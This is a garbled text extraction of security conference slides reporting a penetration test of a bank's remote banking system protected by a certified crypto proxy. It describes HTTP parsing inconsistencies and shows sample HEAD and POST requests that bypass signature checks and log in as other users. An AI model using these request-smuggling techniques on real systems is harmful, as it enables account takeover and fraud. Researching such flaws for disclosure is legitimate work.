You Can Be Anything You Want to Be: Breaking Through Certified Crypto in Banking Apps
Andrew Petukhov (Founder/CTO, Solidlab) George Noseevich (PhD student, MSU)
Dennis Gamayunov (Acting Head, Information Systems Security Lab, MSU)

And along comes...
INTRO
George Noseevich Andrew Petukhov Dennis Gamayunov
2

Part One

__________________________________________________________________

/|There was me, that is Dennis,

\ |

||and my two droogs, that is

| |

||Georgie and Andrew, and we sat

| |

||in the lab making up our

| |

||rassoodocks what to do with the

| |

||Big Bank's RBS, a GOST crypto

| |

||hardened bastard though rare.

| |

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov

\ ^__^ \ (oo)\_______

Dennis Gamayunov

(__)\

)\/\

||----w |

||

||

3

What we see

__________________________________________________________________

·/
|

An

RBS,

which

uses

crypto

for

\ |

| |

­ Non-repudiation

| |

| |

­ Authenticity

| |

|

|

| ­ Protocol security

|

|

|

·|
|

RBS

comply

with

Russian

Central | |

| Bank regulations

|

|

|

·|
|

...unbreakable

:~-(

| |

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov

\ ^__^ \ (oo)\_______

Dennis Gamayunov

(__)\

)\/\

||----w |

||

||

4

What's it going to

be then, eh?

__________________________________________________________________

/

\

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

5

What comes with

UltraViolence

__________________________________________________________________

·/
|

Bypass

non-repudiation

(force

\ |

| RBS to process non-signed

|

| |

requests)

| |

|

|

|· Bypass second authentication |

| |

layer (enforced with crypto)

| |

|

|

|· Which finally allowed to login |

| |

into RBS as any valid user and

| |

| |

file any request to the RBS

| |

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

6

And along comes...
SYSTEM UNDER ASSESSMENT
George Noseevich Andrew Petukhov Dennis Gamayunov
7

Target application

type (1/3)

__________________________________________________________________

·/
|

We

aim

at

pentesting

financial

\ |

| |

organizations, who try to:

| |

| |

­ Ensure transport layer security,

| |

| |

non-repudiation

and

authentication

| |

| |

­ Comply with regulations

| |

| |

­ Protect legacy systems

| |

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

8

Target application

type (2/3)

__________________________________________________________________

/· Technical best-practices

\

| | |

­ Confidentiality, authenticity, nonrepudiation

| | |

|· Compliance

|

| |

­ Use of certified crypto

| |

|· Business needs

|

| |

­ In-house vs outsource

| |

| ­ Solid vs modular

|

| ­ Customer does not simply develop his own |

|

certified crypto

|

| |

­ Outsourcing app development to certified

| |

\

crypto writers ­ never a good idea

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

9

Target application

type (3/3)

__________________________________________________________________

·/
|

Solution:

crypto

hardened

thick

\ |

| |

client + server side

| |

| |

application specific crypto

| |

| |

proxy

| |

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

10

Seeding the arch

__________________________________________________________________

/

Business logic over HTTP

\

|

|

|

Client side

|

Server side

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

Browser

|

|

RBS Application

|

Server

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

11

let's add some REQs

__________________________________________________________________

/

\

|

|

|

Req++: Transport security & Certified crypto

|

| |

Client side

Server side

| |

|

|

|

|

|

|

|

|

|

|

|

|

| | Browser Tunnel endpoint |

Crypto server powered by certified crypto provider
Terminates tunnel

|

RBS Application Server

| |

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

12

a little bit more...

__________________________________________________________________

/

\

|

Req++: Authenticity & Non-repudiation

|

|

|

Client side

|

Server side

|

|

|

|

|

|

|

|

|

|

|

|

|

| | Browser Tunnel endpoint

|

Signs ingress request

|

Puts everything into

|

custom headers

Crypto server
Verifies signature If ok logs for non-repudiation
and passes upstream

RBS Application

|

Server

|

Trusts custom headers | Matches id from session |

with id from header |

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

13

And along comes...
METHODOLOGY
George Noseevich Andrew Petukhov Dennis Gamayunov
14

Common sense suggests

__________________________________________________________________

/|· One doesn't simply implement

\ |

| application level crypto protocol |

|

|

||· One doesn't simply implement HTTP

| |

| client or server from scratch

|

|

|

|· Many parsers in a row suggest

|

|

|

| inconsistencies => possibility for |

| |

smuggling

| |

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov

\ ^__^ \ (oo)\_______

Dennis Gamayunov

(__)\

)\/\

||----w |

||

||

15

Objective

__________________________________________________________________

/

\

|

|

|· Objective:

|

|

|

| ­ find differences in HTTP handling at |

| |

crypto server side and at application

| |

|

server side

|

|

|

|· Exploit:

|

|

|

| ­ use differences to bypass signature

|

| |

validation

| |

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov

\ ^__^ \ (oo)\_______

Dennis Gamayunov

(__)\

)\/\

||----w |

||

||

16

Basic steps for

reversing arch

__________________________________________________________________

/

\

||· Reverse client side features

| |

||· Survey server side features

| |

|
| ·

Fingerprint

integration

protocol

| |

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

17

Dealing with client

side crypto

__________________________________________________________________

/· Which HTTP client and what HTTP

\

| |

parser are used?

| |

| |

­ i.e. windows API or java HttpClient

| |

||·
|

What parts of HTTP getting signed?

request

are

| | |

| |

­ in POST? in GET? in HEAD? in TRACE?

| |

||·
|

What additional metadata attached to requests?

is

| | |

| |

­ how signature is stored?

| |

\ ­ how key ID is passed to the server?

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

18

Dealing with client

side crypto

__________________________________________________________________

/|· Because nothing ever changes...

\ |

| ­ XML Signature Wrapping

|

|

|

|

· another kind of "You can be anything you want to be"

|

|

www.youtube.com/watch?v=RHIkb9yEV1k

|

|

· "Analysis of Signature Wrapping Attacks and

|

|

Countermeasures"

|

| ­ CWE-347: Improper Verification of Cryptographic |

| |

Signature and related CVE

| |

| ­ Web App Cryptology: A Study in Failure

|

| |

­ Now and then: Insecure random numbers

| |

| ­ Now and then: Improper PKI implementation

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

19

Fingerprinting HTTP

parsers

__________________________________________________________________

/
| ·

HTTP

parameter

pollution

\ |

| |

­ the same parameter in query or body

| |

| ­ the same parameter in query and body

|

||· Duplicate headers

| |

| ­ control headers with metadata

|

|

|

| ­ Content-Length header

|

||· HTTP parameter contamination

| |

| ­ which characters are valid for termination |

|

of header values?

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

20

Fingerprinting WWW

server

__________________________________________________________________

/
| ·

Which

HTTP

version

is

supported?

\ |

| | |

­ does crypto server support multiple HTTP requests per connection?

| | |

| ­ does it support HTTP/0.9

|

|

|

|· How does crypto server treat incorrect |

| |

or duplicate Content-Length headers?

| |

|· Which HTTP methods does it support? |

|

|

|· Does crypto server support multipart |

| |

requests or chunked encoding?

| |

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

21

Because nothing

ever changes...

__________________________________________________________________

/

\

|

|

|· Google for <HPP bypass WAF>

|

|

|

|· CWE-444: Inconsistent Interpretation of |

| |

HTTP Requests

| |

|· and all the CVE instances related to CWE- |

| |

444

| |

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

22

Fingerprinting

integration protocol

__________________________________________________________________

/|· How crypto server communicates

\ |

| validation status and metadata to |

|

|

| application server?

|

|

|

| ­ meta data is relayed as submitted by |

| |

the client

| |

| ­ in yet unknown part of the request

|

|

|

| ­ how to get into that part?

|

| | |

· HTTP Trace method/Debug interface in web application/Guess/Brutefroce/Read

| | |

\

documentation/Ask developers aka Social engineer /

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

23

And along comes...
CASE STUDY
George Noseevich Andrew Petukhov Dennis Gamayunov
24

It all started as an

ordinary hack

__________________________________________________________________

/

\

|

|

|  Test our shiny RBS web app, they |

| |

said

| |

| | 

It

comes

with

a

certified

crypto

| |

| |

protection, they said

| |

| | 

Instantly

found

some

common

web

app

| |

| |

bugs

| |

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

25

...then the crypto

came into play

__________________________________________________________________

/ | 

Crypto

ensures

non-repudiation

\ |

| ­ Your crypto-signed attack vectors |

| |

will be used against you in court

| |

| | 

Crypto

ensures

authenticity

| |

| |

­ Session hijacking is essentially

| |

|

useless

|

| |

­ Can't login as other user without

| |

|

his keys

|

|

|

| \



This

greatly

reduces

severity

| /

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

26

Reversing the client

__________________________________________________________________

/ | 

Closed-source

windows

app

\ |

| | 

Traffic

dump

gives

no

clues

| |

|

|

| | 

The

protocol

is

custom,

no

docs

| |

| |

available

| |

| | 

No

time

for

long

IDA

sessions

| |

|

|

| |



Seems

tough



| |

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov

\ ^__^ \ (oo)\_______

Dennis Gamayunov

(__)\

)\/\

||----w |

||

||

27

Reversing the client:

the lazy way

__________________________________________________________________

/ | 

Client

uses

crypto

primitives

\ |

| |

from bundled shared libs

| |

| | 

Library

call

hooks

and

API

call

| |

| |

traces FTW!

| |

|

|

| | 

Filter

traces

to

get

data

that

| |

| |

is easy to understand

| |

·|
|

API

Monitor

(bit.ly/37BTzf)

| |

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

28

API call trace

__________________________________________________________________

/

\

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

29

API call trace

__________________________________________________________________

/

\

|

Encrypt user data

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

30

API call trace

__________________________________________________________________

/

\

|

What is being encrypted?

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

31

API call trace

__________________________________________________________________

/

\

|

What is being encrypted?

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

32

API call trace

__________________________________________________________________

/

\

|

What is being encrypted?

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

33

API call trace

__________________________________________________________________

/

\

|

What is being signed?

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

34

API call trace

__________________________________________________________________

/

\

|

Send it through the tunnel

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

35

API call trace

__________________________________________________________________

/

\

|

Receive encrypted response

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

36

API call trace

__________________________________________________________________

/

\

|

Decrypt the response

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

37

API call trace

__________________________________________________________________

/

\

|

Send it back to browser

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

38

so it comes like this

__________________________________________________________________

/

\

|

Req++: Authenticity & Non-repudiation

|

|

|

Client side

|

Server side

|

|

|

GE|T /login?name=value HTTP/1.1

|

Ho|st: 10.6.28.19

|

|

|

|

|

|

|

| | Browser Tunnel endpoint

|

Signs ingress request

|

Puts everything into

|

custom headers

Crypto server
Verifies signature If ok logs for non-repudiation
and passes upstream

RBS Application

|

Server

|

Trusts custom headers | Matches id from session |

with id from header |

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

39

and is secured like

this

__________________________________________________________________

/

\

|

Req++: Authenticity & Non-repudiation

|

|

|

|

Client side

Server side

|

|

GET /login?name=value HTTP/1.1

|

|

Host: 10.6.28.19

|

|

Certificate_number: 0x849

|

|

Form_data: name=value

|

|

Signature:

|

|

6B8A57A3EA9C25D77C01F4E957D5752C69F61D

|

| | | |

Browser34T5u1nnEe8l e7ndDpDoi1nt8046C51DC9AC9ryAptDo6se3rvCer7718708159B

RBS Application Server

70E3SPiguC3ntF1ssei59nvgeFCrreCAyst82hs irnE5egqDDuinF7etso40t 40234F81If3okDalnoBVdge6spri5fafoiseErssenFssoi5ngunp-Erasett2prueuDraed2mia1tioDn2F389EMTrautcsthsecsuidstofrmomhesaedsseirosn

| | | |

|

custom headers

with id from header |

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

40

Further notices

__________________________________________________________________

/  Proxy signs query string for GET, \

| |

message body for POST

| |

|  The server actually checks that

|

| | |

Form_data reflects the query string/body

| | |

| | 
|

The server signature

checks

the

Cert_num

and

| | |

| | 

The

web

app

checks

that

cert_num

| |

| matches the current user

|

| | 

Kinda

unbreakable,

heh?

| |

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov

\ ^__^ \ (oo)\_______

Dennis Gamayunov

(__)\

)\/\

||----w |

||

||

41

Non-repudiation

Take one

__________________________________________________________________

/

\

|

Bypass Non-repudiation

|

|

|

Client side

|

Server side

|

|

|

HE|AD /bank/welcome?name=value HTTP/1.1

|

Ho|st: 10.6.28.19

|

|

|

|

|

|

|

| | Browser Tunnel endpoint

Crypto server

RBS Application

|

Server

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

42

Non-repudiation

Take one

__________________________________________________________________

/

\

|

Bypass Non-repudiation

|

|

|

Client side

|

Server side

|

|

|

|

HEAD /bank/welcome?name=value HTTP/1.1

|

|

Host: 10.6.28.19

|

|

Certificate_number: 0x849

|

|

|

|

|

| | Browser Tunnel endpoint

Crypto server

RBS Application

|

Server

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

43

Non-repudiation

Take two

__________________________________________________________________

/

\

|

Bypass Non-repudiation

|

|

|

Client side

|

Server side

|

|

|

PO|ST /bank/welcome?name=value1 HTTP/1.1

|

Ho|st: 10.6.28.19

|

Co||ntent-Length: 15

| |

|
na|me=value2
| Browser Tunnel endpoint

Crypto server

|

RBS Application

|

Server

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

44

Non-repudiation

Take two

__________________________________________________________________

/

\

|

POST /bank/wBeylpacsosmNeo?n-nreapmuedi=avtioanlue1 HTTP/1.1

|

|

Host: 10.6.28.19

|

|

CClieonnt stideent-Length: 15

Server side

|

|

Certificate_number: 0x849

|

| | |

Form_data: name=value2 Signature:

| | |

|

3195E979E107731A2572197AB9D8BC01CE2C7EE0C4

|

|

2B97A02393F1263C23E25D2D21E7AA7CB07114491A

|

|

72750C2EFD1AEEAEB357CCry8p7to4seBrvFeBr 3100336F5BD01RBCS0Application |

| Browser 0CTunnel endpoint

Server

|

|

|

|

name=value2

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

45

Non-repudiation

Take two ­ Exploit (!!!)

__________________________________________________________________

/

\

|

POST /bank/wBeylpacsosmNeo?n-nreapmuedi=aatiotntack-value HTTP/1.1

|

|

Host: 10.6.28.19

|

|

CClieonnt stideent-Length: 15

Server side

|

|

Certificate_number: 0x849

|

| | |

Form_data: name=common-value Signature:

| | |

|

3195E979E107731A2572197AB9D8BC01CE2C7EE0C42B9

|

|

7A02393F1263C23E25D2D21E7AA7CB07114491A72750C

|

|

2EFD1AEEAEB357C874BFCBry3p1to0se0rv3e3r 6F5BD01C00C RBS Application

|

| Browser Tunnel endpoint

Server

|

|

name=common-value

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

46

So what?

__________________________________________________________________

/ |

In

Soviet

Russia

who

cares

about

repudiation?

\ |

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

47

Authentication

Log in as any other user

__________________________________________________________________

/

\

|

Bypass crypto authentication

|

|

|

Client side

|

Server side

|

| |

POST http://10.6.28.19/login HTTP/1.1

| |

|

Host: 10.6.28.19

|

|

Content-Type: application/x-www-form-

|

|

urlencoded

|

|

Content-Length: 36

|

| |

BrowserCeTrutnniefl eindcpaoitnte_number: 0Cxry7pt1o7server

RBS Application

|

Server

|

| |

sName=772965163660&sPass=valid.60

| |

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

48

Authentication

Crypto id and session id do not match

__________________________________________________________________

/

\

|

Bypass crypto authentication

|

|

|

Client side

|

Server side

|

|

|

|

|

|

|

|

|

|

|

|

|

| | Browser Tunnel endpoint

Crypto server

RBS Application

|

Server

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

49

Authentication

But...

__________________________________________________________________

/||HhEtAtDp://10.6.28.19/Blyopagsis ncr?ypstNoaamuteh=en7t7ic2at8io6n5163421

\ | |

|&sPass=Cvliaenltisidde.21 HTTP/1.1

Server side

|

|Host: 10.6.28.19

|

|Connection: keep-alive

|

|Content-Length: 10

|

|

|

|p=nonemptybody |||PHOoSsBTtro:whset1rt0p.T:6un/.n/2el18en0.d.1po69in.t 28.19/loginCrypHtoTsTerPve/r1.1 |Content-Type: application/x-www-form|urlencoded

|

|

RBS Application

|

Server

|

|

|

|Content-Length: 36

|

\Certificate_number: 0x717

/

------------------------------------------------------------------

sName=77Ge2or9ge65No1se6ev3ic6h60&sPass=valid.60
Andrew Petukhov
Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

50

Authentication

But...

__________________________________________________________________

/

\

|

HEAD

Bypass crypto authentication

|

|

http://10.6.28.19/login?sName=772865163421&sPass=|

|

Clientvsiadelid.21 HTTP/1.1

Server side

|

|

Host: 10.6.28.19

|

|

Connection: keep-alive

|

| | |

Content-Length: 10 Certificate_number: 0x849

| | |

|

|

|

p=nonemptybody Crypto server

RBS Application

|

| Browser TunPnOelSenTdpohintttp://10.6.28.19/login HTTP/1.1 Server

|

|

Host: 10.6.28.19

|

|

Content-Type: application/x-www-form-urlencoded |

|

Content-Length: 36

|

\

Certificate_number: 0x717

/

------------------------------------------------------------------

\ ^__^
GAenodrrgesew NNPoeasteumekvheio=cvh772965163660&sPass=vali\d.6(o0o)\_______

Dennis Gamayunov

(__)\

)\/\

||----w |

||

||

51

And along comes...
WRAP UP
George Noseevich Andrew Petukhov Dennis Gamayunov
52

At first I was

like...

__________________________________________________________________

/· How typical pentester sees custom crypto \

| |

protocol

| |

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

53

But then...

__________________________________________________________________

/· It looks more intriguing

\

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

54

No surprise

__________________________________________________________________

/· 'I definitely believe that

\

| |

cryptography is becoming less

| |

| important. In effect, even the most |

| |

secure computer systems in the most

| |

| | |

isolated locations have been penetrated over the last couple of

| | |

| |

years by a series of APTs and other

| |

| advanced attacks,' Shamir said during |

| |

the Cryptographers' Panel session at

| |

| the RSA Conference 2013

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov

\ ^__^ \ (oo)\_______

Dennis Gamayunov

(__)\

)\/\

||----w |

||

||

55

Violent curiosity

leads to...

__________________________________________________________________

·/
|

...successful

bypass

\ |

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

56

Contacts

__________________________________________________________________

/

\

|

|

|

|

|

|

|

George Noseevich

|

|

webpentest@bushwhackers.ru

|

|

Andrew Petukhov

|

| | | |

andrew.petukhov@solidlab.ru
Dennis Gamayunov
gamajun@seclab.cs.msu.su

| | | |

|

|

|

|

|

|

|

|

\

/

------------------------------------------------------------------

George Noseevich Andrew Petukhov Dennis Gamayunov

\ ^__^

\ (oo)\_______

(__)\

)\/\

||----w |

||

||

57

